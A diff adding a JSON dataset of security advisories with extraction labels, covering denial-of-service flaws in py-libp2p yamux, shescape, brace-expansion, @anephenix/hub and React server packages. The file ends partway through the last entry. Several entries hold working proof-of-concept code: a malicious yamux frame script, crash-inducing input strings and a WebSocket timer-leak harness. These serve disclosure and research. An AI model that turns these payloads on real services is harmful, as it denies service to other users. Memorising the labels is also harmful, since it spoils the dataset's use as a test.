@@ -1,0 +1,550 @@
+[
+  {
+    "source_ghsa_id": "GHSA-hmj8-5xmh-5573",
+    "input_text": "### Summary\nThe yamux stream multiplexer in py-libp2p does not validate incoming DATA frame lengths against the receive window before reading the frame body. Any peer that completes a standard libp2p handshake can send a single 12-byte frame claiming a 4 GB body, causing the victim's yamux read loop to block indefinitely. This affects the default `new_host()` configuration and requires no special setup on either side.\n\n### Details\nIn `libp2p/stream_muxer/yamux/yamux.py` (lines 915 to 926), the `handle_incoming()` method dispatches on frame type. When a DATA frame arrives, it reads the body unconditionally:\n\n```python\nelif typ == TYPE_DATA:\n    try:\n        data = (\n            await read_exactly(self.secured_conn, length)\n            if length > 0\n            else b\"\"\n        )\n```\n\nThe `length` field is taken directly from the wire-decoded frame header, a 32-bit unsigned integer with a maximum value of 4,294,967,295. There is no check that `length` fits within the stream's receive window (`DEFAULT_WINDOW_SIZE = 256 * 1024` bytes). The body read also happens before the code checks whether the referenced `stream_id` even exists in `self.streams` (that check is at line 954), so any stream ID triggers the issue.\n\n`handle_incoming()` itself is a single sequential loop with no timeout around the body read. Once `read_exactly` suspends waiting for data that never comes, the loop cannot process any subsequent frames. Every stream on that yamux connection stops working, and no exception is raised.\n\nThe same unguarded call appears in the SYN branch at lines 804 to 806, so a crafted SYN frame with a large length field triggers the same stall.\n\nThe yamux specification (section 3.3) explicitly requires the receiver to reset the stream if a sender transmits more data than the receive window allows. py-libp2p does not enforce this on the receiver side. All three comparable implementations do: go-yamux tracks `recvWindow` per stream and returns a `SendWindowExceeded` error on violation; rust-yamux validates frame length against the stream credit; js-libp2p yamux checks frame length against `maxMessageSize`.\n\n### PoC\nThe harness completes a normal noise handshake and yamux negotiation between two local hosts, confirms yamux is healthy with a pre-attack ping, then writes a single malicious frame directly to the attacker's secured connection. After a short pause, it attempts to open a new stream with a 3-second deadline. The stream open never completes.\n\nFile: test_poc.py\n\n```python\n\"\"\"\nauthor: @tahaafarooq\nPOC: yamux connection DoS via oversized data frame (connection DoS)\n\"\"\"\nimport os\nimport secrets\nimport gc\nimport struct\n\nimport psutil\nimport trio\nimport multiaddr\n\nfrom libp2p import new_host\nfrom libp2p.crypto.ed25519 import create_new_key_pair\nfrom libp2p.custom_types import TProtocol\nfrom libp2p.peer.peerinfo import PeerInfo\nfrom libp2p.stream_muxer.yamux.yamux import Yamux\n\nLOOPBACK = multiaddr.Multiaddr(\"/ip4/127.0.0.1/tcp/0\")\nPING = TProtocol(\"/audit/ping/1.0.0\")\n\nYAMUX_HEADER_FORMAT = \"!BBHII\"\nTYPE_DATA = 0x0\nHUGE_LENGTH = 0xFFFF_FFFF  # max uint32 \u2014 4,294,967,295 bytes\n\n\ndef craft_malicious_frame(stream_id: int = 1) -> bytes:\n    \"\"\"\n    12-byte yamux DATA frame with flags=0 and length=4 GB.\n    The stream_id is irrelevant: yamux reads the body BEFORE checking\n    whether the stream exists.\n    \"\"\"\n    return struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, 0, stream_id, HUGE_LENGTH)\n\n\ndef _get_yamux(host, peer_id) -> Yamux | None:\n    swarm = host.get_network()\n    conns = swarm.connections.get(peer_id)\n    if conns is None:\n        return None\n    conn = conns[0] if isinstance(conns, list) else conns\n    mc = conn.muxed_conn\n    return mc if isinstance(mc, Yamux) else None\n\n\nasync def attack():\n    proc = psutil.Process(os.getpid())\n    rss0 = proc.memory_info().rss\n\n    v_kp = create_new_key_pair(secrets.token_bytes(32))\n    a_kp = create_new_key_pair(secrets.token_bytes(32))\n\n    # DEFAULT new_host() \u2014 noise + yamux \u2014 no explicit sec_opt or muxer_opt\n    victim = new_host(key_pair=v_kp)\n    attacker = new_host(key_pair=a_kp)\n\n    victim.set_stream_handler(PING, lambda s: s.close())\n\n    async with victim.run(listen_addrs=[LOOPBACK]):\n        vaddr = victim.get_addrs()[0]\n        assert \"127.0.0.1\" in str(vaddr), \"SAFETY: non-loopback\"\n        print(f\"[*] Victim   : {vaddr}\")\n        print(f\"[*] Config   : DEFAULT (noise + yamux)\")\n\n        async with attacker.run(listen_addrs=[LOOPBACK]):\n            await attacker.connect(PeerInfo(victim.get_id(), victim.get_addrs()))\n            await trio.sleep(0.2)\n\n            a_yamux = _get_yamux(attacker, victim.get_id())\n            v_yamux = _get_yamux(victim, attacker.get_id())\n            assert a_yamux and v_yamux, \"yamux muxed_conn not found\"\n            print(\n                f\"[*] Muxer    : attacker={type(a_yamux).__name__}, \"\n                f\"victim={type(v_yamux).__name__}\"\n            )\n\n            # --- Pre-attack: confirm yamux is healthy ---\n            pre_stream = await attacker.new_stream(victim.get_id(), [PING])\n            await pre_stream.close()\n            print(\"[*] Pre-attack ping: OK (yamux live)\")\n\n            # --- Inject malicious frame ---\n            frame = craft_malicious_frame(stream_id=1)\n            print(\n                f\"[*] Injecting {len(frame)}-byte yamux frame: \"\n                f\"type=DATA flags=0x0 stream_id=1 length={HUGE_LENGTH:#010x} \"\n                f\"({HUGE_LENGTH:,} bytes)\"\n            )\n            print(f\"[*] Frame hex: {frame.hex()}\")\n\n            # Write directly to the noise-encrypted secure conn.\n            # secured_conn.write() encrypts before sending; victim decrypts and\n            # sees the raw yamux frame bytes, which handle_incoming processes.\n            await a_yamux.secured_conn.write(frame)\n            await trio.sleep(0.2)\n            # Victim's handle_incoming has now read the 12-byte header, dispatched\n            # to `elif typ == TYPE_DATA:`, and entered read_exactly(conn, 4GB).\n\n            # --- Post-attack: try to use yamux ---\n            post_attack_succeeded = False\n\n            with trio.move_on_after(3.0):\n                try:\n                    post_stream = await attacker.new_stream(victim.get_id(), [PING])\n                    await post_stream.close()\n                    post_attack_succeeded = True\n                except Exception as e:\n                    print(f\"[*] Post-attack new_stream error: {type(e).__name__}: {e}\")\n\n            gc.collect()\n            rss1 = proc.memory_info().rss\n\n            print(\"\\n=== RESULTS ===\")\n            print(f\"Injected frame (hex) : {frame.hex()}\")\n            print(\n                f\"Body-length field    : {HUGE_LENGTH} bytes requested, 0 bytes sent\"\n            )\n            print(f\"Post-attack ping OK  : {post_attack_succeeded}\")\n            print(f\"RSS delta            : {(rss1 - rss0) / 1024:.1f} KiB\")\n\n            yamux_stuck = not post_attack_succeeded\n            print(f\"\\nVictim yamux loop stuck: {yamux_stuck}\")\n\n            if yamux_stuck:\n                print(\n                    \"[CONFIRMED] handle_incoming blocked - victim yamux dead for \"\n                    \"this connection.\"\n                )\n                print(\n                    \"[IMPACT   ] Single 12-byte write from any authenticated peer \"\n                    \"(post-noise-handshake)\\n\"\n                    \"            permanently stalls yamux for that connection.\\n\"\n                    \"            Affects DEFAULT new_host() config - no mplex required.\\n\"\n                    \"            No timeout, no max-length check, no exception.\"\n                )\n            else:\n                print(\"[NOT CONFIRMED] yamux responded post-attack.\")\n\n            assert yamux_stuck, (\n                \"Expected yamux to be stuck after injecting malicious DATA frame, \"\n                \"but connection remained functional.\"\n            )\n\n\ndef test_yamux_data_frame_stall():\n    trio.run(attack)\n\n\nif __name__ == \"__main__\":\n    trio.run(attack)\n```\n\n```\npython3 -m pytest test_poc.py::test_yamux_data_frame_stall -v\n```\n\nMalicious frame (12 bytes, hex): `00000000000000 01ffffffff`\n\n```\nversion  = 0x00\ntype     = 0x00  (DATA)\nflags    = 0x0000\nstream_id= 0x00000001\nlength   = 0xFFFFFFFF  (4,294,967,295 bytes)\n```\n\nOutput:\n\n```\n[*] Config   : DEFAULT (noise + yamux)\n[*] Pre-attack ping: OK (yamux live)\n[*] Injecting 12-byte yamux frame: type=DATA flags=0x0 stream_id=1 length=0xffffffff\nVictim yamux loop stuck: True\n[CONFIRMED] handle_incoming blocked - victim yamux dead for this connection.\nPASSED in ~3.8s\n```\n\n### Impact\nA single authenticated peer (one that has completed the noise handshake, which requires no credentials) can permanently freeze the yamux read loop for a given connection using 12 bytes of payload. All streams on that connection stop working. No exception is raised, no log entry is written, and no automatic recovery occurs.\n\nThis applies to the default `new_host()` configuration. Unlike a similar issue in the mplex muxer (which requires an explicit opt-in), every py-libp2p node using the standard setup is affected. At the default connection limit of 10,000 connections, an attacker running 10,000 peers can freeze all connections using roughly 120 KB of total traffic.\n\nThere is no confidentiality or integrity impact. The effect is limited to availability on the targeted yamux connection.\n\n### Remediation\n\n**1. Enforce the receive window on inbound DATA frames** (primary fix)\nBefore calling `read_exactly`, reject frames whose declared length exceeds the negotiated receive window:\n\n```python      \n# libp2p/stream_muxer/yamux/yamux.py\n                                                                                                           \nMAX_YAMUX_FRAME = 256 * 1024  # matches DEFAULT_WINDOW_SIZE and go-yamux default\n                                                     \nelif typ == TYPE_DATA:\n    if length > MAX_YAMUX_FRAME:\n        logger.warning(\n            f\"yamux: oversized DATA frame length={length} > {MAX_YAMUX_FRAME}, sending RST\"\n        )\n        rst_header = struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, FLAG_RST, stream_id, 0)\n        await self.secured_conn.write(rst_header)\n        continue  # skip body read; loop processes next frame\n    data = await read_exactly(self.secured_conn, length) if length > 0 else b\"\"\n```\n\nThe same check should be applied to the SYN branch at lines 804 to 806.\n\n**2. Add a per-frame timeout in `handle_incoming()`**\n\n```python\nwhile not self.event_shutting_down.is_set():\n    try:\n        with trio.fail_after(60):\n            header = await read_exactly(self.secured_conn, HEADER_SIZE)\n            ...\n    except trio.TooSlowError:\n        logger.warning(\"yamux: frame read timed out, closing connection\")\n        self.event_shutting_down.set()\n        break\n```\n\nOption 1 eliminates the amplification entirely. Option 2 bounds the worst-case stall duration for any future oversized-read path that might be introduced.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "libp2p",
+              "version_range": "<= 0.6.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "A single malicious frame can cause yamux connections to block indefinitely due to oversized data frames, leading to a denial of service.",
+          "remediation_action": "Ensure that all incoming DATA frame lengths are validated against the receive window and stream credit/checks, similar to implementations such as go-yamux, rust-yamux, and js-libp2p."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-gm3r-q2wp-hw87",
+    "input_text": "### Impact\n\nThis impacts users of Shescape that have flag protection enabled, which is on by default, regardless of the API being used.\n\nAn attacker can cause a runtime quadratic in the input size, causing denial of service for large inputs.\n\n```javascript\nimport { Shescape } from \"shescape\";\n\n// 1. Prerequisites\nconst options = {\n    //flagProtection unspecified\n    // Or\n    flagProtection: true,\n};\n\n// 2. Payload\nlet payload = \"\\u0000-\".repeat(32000);\n\n// 3. Usage\nconst shescape = new Shescape(options);\nlet callback;\n\ncallback = () => shescape.escape(payload);\n// Or\ncallback = () => shescape.escapeAll([payload]);\n// Or\ncallback = () => shescape.quote(payload);\n// Or\ncallback = () => shescape.quoteAll([payload]);\n\nconst t0 = process.hrtime.bigint();\ncallback();\nconst ms = Number(process.hrtime.bigint() - t0) / 1e6;\n\n// 4. Impact\nconsole.log(\"Duration:\", ms);\n// Outputs \"Duration:\" followed by a number close to 20000\n```\n\n### Patches\n\nThis bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.\n\nIf you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.\n\nNo patches will be released for version of Shescape lower than v2.0.0.\n\n### Workarounds\n\nAlternatively, users of Shescape can 1) put restrictions on the length of untrusted input or 2) strip all content before the **last** `-` from untrusted inputs.\n\n### For more information\n\n- Comment on Pull Request [#2651] for v2 and [#2649] for v3\n- Comment on commit [b4b34c3] for v2 and [43d70b5] for v3\n- Open an issue at <https://github.com/ericcornelissen/shescape/issues> (New issue > Question)",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "shescape",
+              "version_range": ">= 3.0.0, < 3.0.1"
+            },
+            {
+              "vendor": "NPM",
+              "product": "shescape",
+              "version_range": ">= 2.1.11, < 2.1.14"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "unknown",
+          "impact_summary": "An attacker can cause a runtime quadratic denial of service for large inputs when using Shescape with flag protection enabled.",
+          "remediation_action": "Users should upgrade to version 3.0.1 of Shescape or higher."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-mh99-v99m-4gvg",
+    "input_text": "### Summary\n\n`expand()` bounds the *number* of results it produces (the `max` option,\n`100_000` by default) but not their *length*. By chaining many brace groups,\nan attacker keeps the result count under `max` while making every result grow\nwith the number of groups. Building `max` long results \u2014 plus the intermediate\narrays combined at each brace group \u2014 exhausts memory and crashes the Node\nprocess with an **uncatchable** out-of-memory error. `try/catch` around\n`expand()` does not help: the fatal error terminates the process.\n\nA ~7.5 KB input (`'{a,b}'.repeat(1500)`) is enough to crash a default Node\nprocess.\n\n### Details\n\nFor `N` chained brace groups such as `'{a,b}'.repeat(N)`:\n\n- the result count is `2^N`, immediately capped at `max` (`100_000`), so the\n  `max` protection appears to hold, but\n- each result is `N` characters long, so the total output size is\n  `max \u00d7 N` characters, which grows without bound in `N`.\n\n`expand_` combines each brace set with the fully-expanded tail:\n\n```js\nconst post = m.post.length ? expand_(m.post, max, false) : ['']\n...\nfor (let j = 0; j < N.length; j++) {\n  for (let k = 0; k < post.length && expansions.length < max; k++) {\n    const expansion = pre + N[j] + post[k]   // grows one group longer per level\n    ...\n    expansions.push(expansion)\n  }\n}\n```\n\nThe loop guard `expansions.length < max` limits how many strings are built, but\nnothing limits how long they get. Each recursion level materializes another\narray of up to `max` strings, one character longer than the level below, and \u2014\nbecause V8 represents `pre + N[j] + post[k]` as a cons-string (rope) that\nreferences `post[k]` \u2014 those intermediate strings stay reachable through the\nwhole chain. Memory therefore scales with `max \u00d7 N`.\n\nMeasured on `5.0.7` (`'{a,b}'.repeat(N)`, default `max`):\n\n| groups (N) | input bytes | result count | peak RSS |\n|---|---|---|---|\n| 20 | 100 | 100,000 | ~80 MB |\n| 50 | 250 | 100,000 | ~214 MB |\n| 100 | 500 | 100,000 | ~409 MB |\n| 300 | 1,500 | 100,000 | ~1,148 MB |\n| 1500 | 7,500 | \u2014 | **OOM crash** |\n\n### Proof of concept\n\n```js\nconst { expand } = require('brace-expansion')\n\n// ~7.5 KB input \u2014 crashes the process with a fatal, uncatchable OOM:\n//   FATAL ERROR: ... JavaScript heap out of memory\ntry {\n  expand('{a,b}'.repeat(1500))\n} catch (e) {\n  // never reached \u2014 the process is already dead\n}\n```\n\n### Impact\n\nAny application that passes attacker-influenced strings to\n`brace-expansion.expand()` \u2014 directly, or transitively via `minimatch` / `glob`\nbrace patterns \u2014 can be crashed by a small request. Because the failure is a\nfatal V8 out-of-memory error rather than a thrown exception, it cannot be caught\nand it takes down the whole worker/process, denying service.\n\n### Remediation\n\nUpgrade to a patched release. The fix bounds the total number of characters a\nsingle `expand()` call may accumulate (`EXPANSION_MAX_LENGTH`, default\n`4_000_000`, configurable via a new `maxLength` option), applied inside the\noutput-building loops so intermediate arrays are bounded too. Once the limit is\nreached, output is truncated \u2014 consistent with how `max` already truncates \u2014\ninstead of growing without bound. The limit sits well above any realistic\nexpansion (100,000 results hitting `max` measure ~1M characters), so legitimate\ninput is unaffected.\n\nAfter the fix, `'{a,b}'.repeat(1500)` returns a bounded, truncated result in\n~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB\nheap.\n\nThe fix bounds memory but the algorithm still rebuilds intermediate arrays at\neach level (roughly `O(N \u00d7 maxLength)` work on this input class). A streaming\nrewrite that produces output in `O(total output size)` can be a non-urgent\nfollow-up.\n\nIf immediate upgrade isn't possible, avoid passing untrusted input to\n`expand()` / glob brace patterns, or pass a small explicit `max` **and**\n`maxLength`.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-14257",
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "brace-expansion",
+              "version_range": "<= 5.0.7"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "An attacker can crash a Node.js application that uses brace-expansion by providing a sufficiently large input string.",
+          "remediation_action": "Upgrade to a patched release with bounds on the total number of characters expand() may accumulate."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-g5vv-q72c-7j78",
+    "input_text": "### Summary\n\n`@anephenix/hub` starts a `setInterval` polling loop for every incoming WebSocket connection to request a client ID via RPC. If the remote client never replies \u2014 which requires no authentication or special configuration \u2014 the interval and the pending request object are never cleaned up, even after the socket is closed. An unauthenticated attacker who opens many WebSocket connections and ignores all server RPC messages will therefore cause the server to accumulate unbounded timers and heap entries, leading to CPU and memory exhaustion (DoS).\n\n### Details\n\nWhen a client connects, `loadDefaultConnectionEventListeners` (registered in `src/lib/index.ts:128`) adds a connection listener that calls `requestClientId({ ws, rpc })` for every new WebSocket (`src/lib/index.ts:262`). `requestClientId` issues an RPC send for the `get-client-id` action (`src/lib/clientId.ts:112`), which internally calls `rpc.send`.\n\nInside `rpc.send`, the payload is pushed onto `this.requests` (`src/lib/rpc.ts:282`) and `waitForReply` is invoked. `waitForReply` starts a `setInterval` that polls `responses[]` every 10 ms for a matching reply (`src/lib/rpc.ts:250`):\n\n```ts\n// src/lib/rpc.ts:250\u2013267\ninterval = setInterval(() => {\n    const response = responses.find(\n        (r) => r.id === id && r.action === action,\n    );\n    if (response) {\n        if (interval) clearInterval(interval);\n        // ... resolve and cleanup\n        this.cleanupRPCCall(response);\n    }\n}, 10);\n```\n\n`clearInterval` is only called when a matching response arrives. There is no timeout path and no socket-close handler that clears either the interval or the `this.requests` entry. The `close` handler registered in `loadDefaultConnectionEventListeners` (`src/lib/index.ts:128\u2013134`) only calls `pubsub.unsubscribeClientFromAllChannels`; it does not cancel pending RPC requests for that socket.\n\n**Data flow (source \u2192 sink):**\n\n1. `src/lib/index.ts:269` \u2014 `wss.on(\"connection\")` accepts any remote WebSocket (no authentication).\n2. `src/lib/index.ts:272` \u2014 connection listeners are iterated and invoked.\n3. `src/lib/index.ts:262` \u2014 `requestClientId({ ws, rpc: this.rpc })` is called for every connection by default.\n4. `src/lib/clientId.ts:112` \u2014 `rpc.send({ ws, action: 'get-client-id' })` creates an RPC request.\n5. `src/lib/rpc.ts:282` \u2014 `this.requests.push(payload)` registers the pending request.\n6. `src/lib/rpc.ts:250` \u2014 `setInterval(..., 10)` begins infinite polling; cleanup only happens on a matching response. Socket close does not trigger cleanup.\n\n### PoC\n\n**Prerequisites:** Docker must be available on the host.\n\n**Step 1 \u2014 Build the verification image:**\n\n```bash\ndocker build --no-cache \\\n  -f vuln-001/Dockerfile \\\n  -t hub-vuln-001:latest \\\n  reports/npm_web_272_anephenix__hub\n```\n\n**Step 2 \u2014 Run the container:**\n\n```bash\ndocker run --rm --network none hub-vuln-001:latest\n```\n\nThe container runs `verify.mjs`, which:\n1. Starts a `Hub` server on a local port.\n2. Opens a WebSocket and waits for the server's `get-client-id` RPC message without replying.\n3. Closes the socket and waits 300 ms.\n4. Inspects `hub.rpc.requests.length` \u2014 it must remain `1` even though `hub.wss.clients.size` is `0`.\n5. Opens five more sockets the same way (batch), then verifies that `pendingRpcRequests` equals `6`.\n\n**Step 3 \u2014 Alternatively, run the Python orchestrator directly:**\n\n```bash\npython3 vuln-001/poc.py\n```\n\n**Expected output (confirmed):**\n\n```json\n{\n  \"snapshotAfterClose\":  {\"clientState\": 3, \"serverClients\": 0, \"pendingRpcRequests\": 1},\n  \"snapshotAfterBatch\":  {\"serverClients\": 0, \"pendingRpcRequests\": 6, \"expectedPendingRpcRequests\": 6}\n}\n```\n\n`pendingRpcRequests` grows linearly with the number of unanswered connections and never decreases, confirming the unbounded resource leak.\n\n**Minimal inline reproduction** (without Docker, inside the repository after `npm ci && npm run build`):\n\n```bash\nnode --input-type=module - <<'EOF'\nimport Hub from './dist/esm/index.js';\nimport { WebSocket } from 'ws';\n\nconst port = 8766;\nconst hub = new Hub({ port });\nhub.listen();\nconst ws = new WebSocket(`ws://localhost:${port}`);\n\nawait new Promise((resolve) => ws.once('message', resolve));\nws.close();\nawait new Promise((resolve) => setTimeout(resolve, 300));\nconsole.log(JSON.stringify({\n  serverClients:      hub.wss.clients.size,\n  pendingRpcRequests: hub.rpc.requests.length,\n}));\nhub.server.close();\nprocess.exit(0);\nEOF\n```\n\nExpected:\n\n```json\n{\"serverClients\": 0, \"pendingRpcRequests\": 1}\n```\n\n### Impact\n\nThis is an **unauthenticated Denial-of-Service** vulnerability. Any network-reachable `@anephenix/hub` server running with default configuration is affected. An attacker who opens a large number of WebSocket connections and never replies to the server's `get-client-id` RPC causes the server process to accumulate one `setInterval` timer (polling every 10 ms) and one heap object per connection indefinitely. With enough connections this exhausts CPU scheduling time and memory, making the server unavailable to legitimate clients.\n\nNo authentication, special headers, or knowledge of internal protocol details are required \u2014 a plain WebSocket `connect` followed by silence is sufficient.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\nFROM node:20-alpine\n\nRUN apk add --no-cache python3 make g++\n\nWORKDIR /app\n\n# Install dependencies first for layer caching\nCOPY repo/package.json repo/package-lock.json ./\nRUN npm ci --ignore-scripts\n\n# Copy the rest of the source and build\nCOPY repo/ ./\nRUN npm run build\n\n# Copy the vulnerability verification script into /app so node_modules is resolvable\nCOPY vuln-001/verify.mjs /app/verify.mjs\n\nCMD [\"node\", \"/app/verify.mjs\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nVULN-001 PoC \u2014 Unauthenticated WebSocket RPC Waiter Resource Exhaustion\n(@anephenix/hub v0.2.15)\n\nBuilds a Docker image containing the hub library and a verification script,\nthen runs the container to produce deterministic evidence that\nhub.rpc.requests[] entries (and their backing setInterval timers) are never\ncleaned up when a WebSocket client disconnects without replying to the\nserver's \"get-client-id\" RPC request.\n\nUsage:\n    python3 poc.py\n\nExit codes:\n    0  \u2014 vulnerability confirmed (PASS)\n    1  \u2014 not reproduced (FAIL)\n    2  \u2014 environment / build error\n\"\"\"\n\nimport json\nimport subprocess\nimport sys\nfrom pathlib import Path\n\n# ---------------------------------------------------------------------------\n# Paths\n# ---------------------------------------------------------------------------\nSCRIPT_DIR = Path(__file__).resolve().parent\nREPO_ROOT   = SCRIPT_DIR.parent              # \u2026/npm_web_272_anephenix__hub/\nDOCKERFILE  = SCRIPT_DIR / \"Dockerfile\"\nPOC_TAG     = \"hub-vuln-001:latest\"\n\nBUILD_CMD = [\n    \"docker\", \"build\",\n    \"--no-cache\",\n    \"-f\", str(DOCKERFILE),\n    \"-t\", POC_TAG,\n    str(REPO_ROOT),   # build context = parent dir so COPY repo/ and COPY vuln-001/ both resolve\n]\n\nRUN_CMD = [\n    \"docker\", \"run\",\n    \"--rm\",\n    \"--network\", \"none\",  # no external network access needed\n    POC_TAG,\n]\n\n\ndef banner(msg: str) -> None:\n    print(f\"\\n{'='*60}\\n  {msg}\\n{'='*60}\")\n\n\ndef run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:\n    print(\"$\", \" \".join(cmd))\n    return subprocess.run(cmd, **kwargs)\n\n\ndef build_image() -> None:\n    banner(\"Phase 1 \u2014 Building Docker image\")\n    result = run(BUILD_CMD, capture_output=False)\n    if result.returncode != 0:\n        print(\"[ERROR] Docker build failed.\", file=sys.stderr)\n        sys.exit(2)\n    print(\"[OK] Image built:\", POC_TAG)\n\n\ndef run_poc() -> dict:\n    banner(\"Phase 2 \u2014 Running vulnerability verification inside container\")\n    result = run(RUN_CMD, capture_output=True, text=True)\n\n    print(\"--- container stdout ---\")\n    print(result.stdout)\n    if result.stderr:\n        print(\"--- container stderr ---\")\n        print(result.stderr)\n\n    # The container exits 0 on confirmed leak, 1 otherwise.\n    if result.returncode == 2:\n        print(\"[ERROR] Verification script crashed.\", file=sys.stderr)\n        sys.exit(2)\n\n    try:\n        data = json.loads(result.stdout)\n    except json.JSONDecodeError as exc:\n        print(f\"[ERROR] Could not parse container output as JSON: {exc}\", file=sys.stderr)\n        sys.exit(2)\n\n    return data, result.returncode\n\n\ndef evaluate(data: dict, container_exit: int) -> tuple[bool, str]:\n    \"\"\"Return (passed, evidence_summary).\"\"\"\n    after_close = data.get(\"snapshotAfterClose\", {})\n    after_batch  = data.get(\"snapshotAfterBatch\", {})\n\n    leaked_single = (\n        after_close.get(\"pendingRpcRequests\", 0) > 0 and\n        after_close.get(\"serverClients\", -1) == 0 and\n        after_close.get(\"clientState\", -1) == 3          # WebSocket.CLOSED\n    )\n\n    leaked_batch = (\n        after_batch.get(\"pendingRpcRequests\", 0) ==\n        after_batch.get(\"expectedPendingRpcRequests\", -1)\n    )\n\n    passed = leaked_single and leaked_batch and container_exit == 0\n\n    evidence = (\n        f\"snapshotAfterClose={json.dumps(after_close)}; \"\n        f\"snapshotAfterBatch={json.dumps(after_batch)}; \"\n        f\"container_exit={container_exit}\"\n    )\n    return passed, evidence\n\n\ndef main() -> None:\n    build_image()\n    data, container_exit = run_poc()\n\n    banner(\"Phase 3 \u2014 Evaluating results\")\n    passed, evidence = evaluate(data, container_exit)\n\n    if passed:\n        print(\"[PASS] Leak confirmed: RPC waiter entries persist after socket close.\")\n    else:\n        print(\"[FAIL] Leak NOT observed \u2014 check container output above.\")\n\n    return passed, evidence, data\n\n\nif __name__ == \"__main__\":\n    passed, evidence, raw = main()\n\n    verdict = \"PASS\" if passed else \"FAIL\"\n    reason = (\n        \"\uc18c\ucf13\uc774 \ub2eb\ud78c \ub4a4\uc5d0\ub3c4 hub.rpc.requests[] \ud56d\ubaa9\uacfc setInterval \ud0c0\uc774\uba38\uac00 \ud574\uc81c\ub418\uc9c0 \uc54a\uc74c\uc774 \"\n        \"\ub7f0\ud0c0\uc784 \uac80\uc0ac\ub85c \ud655\uc778\ub428. \ub2e8\uc77c \uc5f0\uacb0\uc5d0\uc11c pendingRpcRequests=1\uc774 \uc720\uc9c0\ub418\uace0, \"\n        \"\ubc30\uce58 5\uac1c \ucd94\uac00 \ud6c4 \ucd1d 6\uac1c\uac00 \ub204\uc801\ub418\uc5b4 \uc120\ud615 \ub9ac\uc18c\uc2a4 \ub204\uc218\uac00 \uc99d\uba85\ub428.\"\n        if passed else\n        \"\ucee8\ud14c\uc774\ub108 \uc2e4\ud589 \uacb0\uacfc\uc5d0\uc11c \uacb0\uc815\uc801 \uc99d\uac70\ub97c \ud655\ubcf4\ud558\uc9c0 \ubabb\ud588\uc74c.\"\n    )\n\n    result_path = SCRIPT_DIR / \"phase2_result.json\"\n    phase2 = {\n        \"passed\": passed,\n        \"verdict\": verdict,\n        \"reason\": reason,\n        \"build_command\": \" \".join(BUILD_CMD),\n        \"run_command\": \" \".join(RUN_CMD),\n        \"poc_command\": f\"python3 {Path(__file__).name}\",\n        \"evidence\": evidence,\n        \"artifacts\": [\"Dockerfile\", \"verify.mjs\", \"poc.py\"],\n    }\n\n    result_path.write_text(json.dumps(phase2, indent=2, ensure_ascii=False))\n    print(f\"\\n[INFO] Results written to {result_path}\")\n\n    sys.exit(0 if passed else 1)\n```",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "@anephenix/hub",
+              "version_range": "< 0.2.16"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "A DoS vulnerability exists where unauthenticated attackers can cause a server to accumulate unbounded timers and heap entries via WebSocket connections.",
+          "remediation_action": "Implement socket close handlers that also clean up pending RPC requests for that socket."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-wx67-qw84-cm4g",
+    "input_text": "### Impact\n\nA denial of service vulnerability could be triggered by sending specially crafted HTTP requests to server function endpoints, this could lead to out-of-memory exceptions or excessive CPU usage.\n\nWe recommend updating immediately.\n\nThe vulnerability exists in versions 19.0.0 through 19.0.7, 19.1.0 through 19.1.8, and 19.2.0 through 19.2.7 of:\n- react-server-dom-webpack\n- react-server-dom-parcel\n- react-server-dom-turbopack\n\n### Patches\n\nFixes were back ported to versions 19.0.8, 19.1.9, and 19.2.8.\n\nIf you are using any of the above packages please upgrade to any of the fixed versions immediately.\n\nIf your app\u2019s React code does not use a server, your app is not affected by this vulnerability. If your app does not use a framework, bundler, or bundler plugin that supports React Server Components, your app is not affected by this vulnerability.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-44907",
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-webpack",
+              "version_range": ">= 19.2.0, < 19.2.8"
+            },
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-parcel",
+              "version_range": ">= 19.2.0, < 19.2.8"
+            },
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-turbopack",
+              "version_range": ">= 19.2.0, < 19.2.8"
+            },
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-webpack",
+              "version_range": ">= 19.1.0, < 19.1.9"
+            },
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-parcel",
+              "version_range": ">= 19.1.0, < 19.1.9"
+            },
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-turbopack",
+              "version_range": ">= 19.1.0, < 19.1.9"
+            },
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-turbopack",
+              "version_range": ">= 19.0.0, < 19.0.8"
+            },
+            {
+              "vendor": "NPM",
+              "product": "react-server-dom-webpack",
+              "version_range": ">= 19.0.0, < 19.0.8"
+            }
+          ],
